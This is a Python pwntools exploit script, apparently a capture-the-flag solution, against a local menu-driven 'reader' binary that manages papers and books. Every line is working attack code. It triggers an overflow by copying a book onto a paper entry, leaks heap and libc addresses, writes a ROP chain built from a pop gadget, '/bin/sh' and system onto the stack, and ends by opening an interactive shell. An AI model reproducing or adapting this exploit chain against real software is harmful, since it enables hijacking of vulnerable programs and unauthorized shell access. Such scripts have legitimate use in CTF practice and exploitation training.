from pwn import *
context.log_level='debug'

p = process('./pwn2_reader.main')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(idx,content,title,desc,flag):
	if flag:#book
		p.sendlineafter('>','3')
	else:   #paper
		p.sendlineafter('>','2')
	p.sendlineafter("Where you want to edit/input?\n>",str(idx))
	p.sendafter("please input content\n>",content)
	p.sendafter("input your title\n>",title)
	p.sendafter("input your description\n>",desc)

def copy(idx,dest,flag):
	if flag:#book to paper
		p.sendlineafter('>','4')
		p.sendlineafter("Which book you want to export\n>",str(idx))
	else:   #paper to book
		p.sendlineafter('>','5')
		p.sendlineafter("Which paper you want to export\n>",str(idx))
	p.sendlineafter("where you want to output\n>",str(dest))
def dele(idx,flag):
	p.sendlineafter('>','7')
	if flag:
		p.sendlineafter("what do you want to delete?\n1. paper\n2. book\n>",'2')
	else:
		p.sendlineafter("what do you want to delete?\n1. paper\n2. book\n>",'1')
	p.sendlineafter("which one you want to delete?\n>",str(idx))

add(1,'c'*255,'t'*31,'d'*128+p32(0)+p32(56)+'a'*56+'\n',1)#book 0
copy(1,9,1)#book 0 to paper 8,overwrite paper 9
dele(10,0)#delete paper 9
p.recvuntil('a'*56)
heap_addr = u64((p.recv(6)).ljust(8,'\x00'))-0x18
log.info("heap_addr:%#x",heap_addr)


'''
rbp_24 = heap_addr + 0x26b8
add(10,'c'*152+p64(rbp_24),'t'*31,'d'*127,0)
add(1,'c'*255,'t'*31,'d'*128+p32(0)+p32(1120)+'\n',1)
copy(1,9,1)
dele(10,0)
'''
add(1,'c'*255,'t'*31,'d'*128+p32(0)+p32(48)+'a'*48+'\n',1)#book 0
copy(1,9,1)#book 0 to paper 8,overwrite paper 9
dele(10,0)#delete paper 9

p.recvuntil('c'*32)
libc_addr = u64((p.recv(6)).ljust(8,'\x00'))-0x3c48e0
log.info("libc_addr:%#x",libc_addr)

sys_addr = libc_addr + libc.symbols['system']
binsh_addr = libc_addr + next(libc.search('/bin/sh'))

pr_addr = libc_addr + 0x21102

add(2,'c'*200+p64(sys_addr)+'\n','t'*31,'d'*127,0)#paper 1
add(2,'c'*192+p64(binsh_addr)[:-1]+'\n','t'*31,'d'*127,0)#paper 1
add(2,'c'*184+p64(pr_addr)[:-1]+'\n','t'*31,'d'*127,0)#paper 1
add(2,'c'*168+p64(heap_addr+0x10)[:-1]+'\n','t'*31,'d'*127,0)#paper 1
rbp_24 = heap_addr + 0x26b8
add(2,'c'*152+p64(rbp_24)[:-1]+'\n','t'*31,'d'*127,0)#paper 1

add(1,'c'*255,'t'*31,'d'*128+p32(0)+p32(256)+'\n',1)
copy(1,1,1)#book 0 to paper 0,overwrite paper 1
gdb.attach(p)
dele(2,0)
p.interactive()

